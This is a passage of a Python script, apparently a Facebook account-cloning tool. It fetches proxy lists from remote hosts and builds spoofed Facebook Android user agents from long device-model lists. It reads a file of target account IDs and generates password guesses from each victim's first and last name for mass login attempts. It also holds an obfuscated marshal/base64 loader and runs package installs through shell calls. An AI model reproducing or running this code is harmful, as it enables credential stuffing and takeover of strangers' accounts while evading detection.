
# — — — — — — — — — — — — —
# Tool Made By @i6iii1
# Encoding: Pycdc 3.11
# Decode By @i6iii1
# Channel @mafiams1
# — — — — — — — — — — — — —


import lzma
import zlib
import codecs
import base64
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));
import os,requests,json,time,re,random,sys,uuid,string,subprocess,zlib,platform
import marshal
import os,httpx
import os,base64
from os import system as clr
#print('\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32m install modules...\n PLEASE WAIY CHAKENG YOUR PAID...')
#os.system('pip install httplib2')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred 
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python Hammadi.py')

#------------------[ PROXY SERVER ]-------------------#
proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
open('socksku.txt', 'w').write(proxylist)
proxsi = open('socksku.txt', 'r').read().splitlines()

os.system('rm -rf prox.txt')  
try:
    prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
    open('prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('prox.txt','r').read().splitlines()
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550    5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]

#os.system('pip install httpx')
#os.system('pip install requests rich')
#os.system('pip install requests')
os.system('pip install mechanize')
#os.system('pip install bs4 httpx')
#os.system('clear')
print(' WELCOME TO Hammadi WORLD          ')

#------------------[ User agent 3  ]-------------------#
model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()   

gtt=random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T'])
    
kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])

def UA():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[Mozilla/3.0 (Linux; Android 9.3.3; GT-I9505 Build/SKQ1.210216.001) [FBAN/FB4A;FBAV/443.0.0.28.39;FBBV/33923556;FBDM/{density=2.0,width=1920,height=1080};FBLC/en_GB;FBCR/Metro by T-Mobile;FBMF/('samsung', 'motorola');FBBD/('samsung', 'motorola');FBPN/com.facebook.adsmanager;FBDV/GT-I9505;FBSV/9.3.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    c = ";[Mozilla/3.0 (Linux; Android 9.3.3; GT-I9505 Build/SKQ1.210216.001) [FBAN/FB4A;FBAV/443.0.0.28.39;FBBV/33923556;FBDM/{density=2.0,width=1920,height=1080};FBLC/en_GB;FBCR/Metro by T-Mobile;FBMF/('samsung', 'motorola');FBBD/('samsung', 'motorola');FBPN/com.facebook.adsmanager;FBDV/GT-I9505;FBSV/9.3.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    d = ";[Dalvik/2.1.0 (Linux; U; Android 7; SM-T720 Build/QP1A.186601.664) [FBAN/FB4A;FBAV/248.1.0.44.116;FBBV/184540721;FBDM/{density=3.25,width=1280,height=2256};FBLC/en_US;FBRV/184540721;FBCR/;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/IN2023;FBSV/8.0;FBBK/1;FBOP/1;FBCA/arm64-v8a;]"
    e = ";[Dalvik/2.1.0 (Linux; U; Android 7; SM-T720 Build/QP1A.186601.664) [FBAN/FB4A;FBAV/248.1.0.44.116;FBBV/184540721;FBDM/{density=3.25,width=1280,height=2256};FBLC/en_US;FBRV/184540721;FBCR/;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/IN2023;FBSV/8.0;FBBK/1;FBOP/1;FBCA/arm64-v8a;]"
    f = ";[Dalvik/2.1.0 (Linux; U; Android 7; SM-T720 Build/QP1A.186601.664) [FBAN/FB4A;FBAV/248.1.0.44.116;FBBV/184540721;FBDM/{density=3.25,width=1280,height=2256};FBLC/en_US;FBRV/184540721;FBCR/;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/IN2023;FBSV/8.0;FBBK/1;FBOP/1;FBCA/arm64-v8a;]"
    g = ";[FBAN/Orca-Android;FBAV/26.0.0.4613;FBBV/4146078;[FBAN/Orca-Android;FBAV/139.0.0.17.85;[FBAN/Orca-Android;FBAV/346.0.0.7.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/348143439;FBCR/HOME;FBMF/LGE;FBBD/lge;FBDV/SM-A245F;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1356};FB_FW/1;]"
    l = ";[FBAN/Orca-Android;FBAV/26.0.0.4613;FBBV/4146078;[FBAN/Orca-Android;FBAV/139.0.0.17.85;[FBAN/Orca-Android;FBAV/346.0.0.7.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/348143439;FBCR/HOME;FBMF/LGE;FBBD/lge;FBDV/SM-A245F;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1356};FB_FW/1;]"
    h = ";[FBAN/Orca-Android;FBAV/26.0.0.4613;FBBV/4146078;[FBAN/Orca-Android;FBAV/139.0.0.17.85;[FBAN/Orca-Android;FBAV/346.0.0.7.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/348143439;FBCR/HOME;FBMF/LGE;FBBD/lge;FBDV/SM-A245F;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1356};FB_FW/1;]"
    j = ";[Dalvik/2.1.0 (Linux; U; Android 11; RMX1947 Build/G985FXXU7DTJ2) [FBAN/FB4A;FBAV/94.0.0.59.68;FBBV/20748110;FBDM/{density=2.1,width=720,height=1280};FBLC/en_GB;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/IML74K|MIJ77G14XB;FBSV/8.1.1;nullFBCA/armeabi-v8a:armeabi;]"
    k = ";[FBAN/FB4A;FBAV/826.0.0.6089;FBBV/7042558;[FBAN/FB4A;FBAV/845.0.0.48.122;FBBV/1601592;FBDM/{density=2.0,width=720,height=1456};FBLC/en_GB;FBRV/273474118;FBCR/I TIM;FBMF/VIVO;FBBD/VIVO;FBPN/com.facebook.katana;FBDV/X23;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a;]"
    ua = a+b+c+d+e+f+g+l+h+j+k
    return ua   
#------------------[ User agent 4  ]-------------------#
def UAA():
    tipecnc = random.choice(["T-Mobile"," vodafone ES"," vodafone"," TELCEL"," Android"," vodafone ES"," Viettel Telecom"," MegaFon"," cricket"," AIS"," Bouygues Telecom"," T-Mobile"," Telstra"," Telkomsel"," null"," Maxcom"," vodafone.de"," Yoigo"," PLAY (T-Mobile"," airtel"]) 
    cnc = random.choice(["fr_GN"," en_AU"," es_ES"," en_US"," in_ID"," en_GB"," id_ID"," cs_CZ"," pt_BR"," bg_BG"," fr_FR"," id_ID"," es_MX","th_TH","vi_VN","en_EG","fr_FR","sv_SE"]) 
    model2 = random.choice(["SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K"])
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END ="[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";[FBAN/FB4A;FBAV/"+str(random.randint(11,454))+'.0.0.'+str(random.randrange(10,60))+str(random.randint(100,200))+";FBPN/com.facebook.katana;FBLC/"+cnc+";FBBV/"+str(random.randint(11111111,99999999))+";FBCR/"+tipecnc+";FBMF/samsung;FBBD/samsung;FBDV/"+model2+";FBSV/"+str(random.randint(1,15))+";FBCA/armeabi-v7a:armeabi;FBDM/{density="+str(random.randint(1,5))+",width="+str(random.randint(360,2600))+",height="+str(random.randint(900,9999))+"};FB_FW/"+str(random.randint(1,10))+";FBRV/"+str(random.randint(11111111,99999999))+";]" 
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
#------------------[ COLORS ]-------------------#

# {gas} أخضر
# {green} أخضر
# {red}  احمر
# {white} أبيض
# {faltu}{red} [] 
def p(x):
	print(x)
	
logo=("""
\033[1;37m########        ## ##     ## 
\033[1;32m##     ##       ##  ##   ##  
\033[1;37m##     ##       ##   ## ##   
\033[1;32m##     ##       ##    ###    
\033[1;37m##     ## ##    ##   ## ##   
\033[1;32m##     ## ##    ##  ##   ##  
\033[1;37m#######   ######  ##     ##                                                                     
\033[1;32m<=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m>+<\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32=\033[1;32m\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;37m=\033[1;32\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m>
\033[1;32m[\033[1;37m*\033[1;32m] \033[1;37m OWNER    \033[1;32m:\033[1;37m Hammadi
\033[1;32m[\033[1;37m*\033[1;32m] \033[1;37m Telegram \033[1;32m:\033[1;37m https://t.me/python_MV4
\033[1;32m[\033[1;37m*\033[1;32m] \033[1;37m Version  \033[1;32m: \033[1;32m 0.1
\033[1;32m[\033[1;37m*\033[1;32m] \033[1;37m 𝐒𝐓𝐀𝐓𝐔𝐒   \033[1;32m:\033[1;32m FREE
\033[1;32m<=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m>+<\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32=\033[1;32m\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;37m=\033[1;32\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m>""")
def linex():
        print('\033[1;32m<=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m>+<\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32=\033[1;32m\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;37m=\033[1;32\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m=\033[1;32\033[1;32m=\033[1;37m=\033[1;32m=\033[1;37m>')
#------------------[ system clear ]-------------------#
def clear():
        os.system('clear')
        print(logo)
#------------------[ system  ]-------------------#
loop=0
lim=0
tp=0
oks=[]
cps=[]
pcp=[]
id=[]
plist = []
methods = []
speed = []
twf = []
#------------------[ MENU Hammadi  ]-------------------#
def menu():
                        clear()
                        print('\033[1;37m [1] \033[1;37mFile Cloning\n \033[1;37m[0] \033[1;37mExit ')
                        linex()
                        xd=input('\033[1;37m  CHOOSE : ')
                        if xd in ['1','01']:
                                clear()
                                print('\033[1;32mFILE EXAMPLE : /sdcard/Hammadi.txt')
                                linex()
                                file = input('\033[1;37m ENTER FILE PATH\033[1;37m : ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print('\033[1;37m FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print('\033[1;37m TRY METHOD 1 & 4 FOR BEST RESULTS ')
                                linex()
                                print('\033[1;37m [1] METHOD')
                                print('\033[1;37m [2] METHOD')
                                print('\033[1;37m [3] METHOD')
                                print('\033[1;37m [4] METHOD')
                                #print(' \033[1;32m[\033[1;31m5\033[1;32m] METHOD / \033[1;31mUPDTED ')
                                linex()
                                mthd=input('\033[1;32m CHOOSE : ')
                                linex()
                                plist = []
                                clear()
                                print("\033[1;37m  [1] AUTO PASSWORD ")                                
                                print("\033[1;37m  [2] MANUAL PASSWORD ") 
                                linex()
                                psx=input('\033[1;37m  CHOOSE : ')
                                if psx in ['1','01']:
                                        plist.append('first first')
                                        plist.append('first last')
                                        plist.append('last first')
                                        plist.append('last last')
                                        plist.append('firstfirst')     
                                        plist.append('firstlast')
                                        plist.append('lastfirst')
                                        plist.append('lastlast')
                                        plist.append("firstlast123")
                                        plist.append("firstlast1234")
                                        plist.append('firstlast12345')
                                        plist.append('first 123')
                                        plist.append('first 1234')
                                        plist.append('first 12345')
                                        plist.append('first12')
                                        plist.append('first123')
                                        plist.append('first1234')
                                        plist.append('first12345')
                                        plist.append('first123456')
                                        plist.append('first123456789')
                                        plist.append('first123123')
                                        plist.append('first@123')
                                        plist.append('first@1234')
                                        plist.append('first@12345')
                                        plist.append('first@last')
                                        plist.append('first@@')
                                        plist.append('first112233')
                                else:
                                        try:
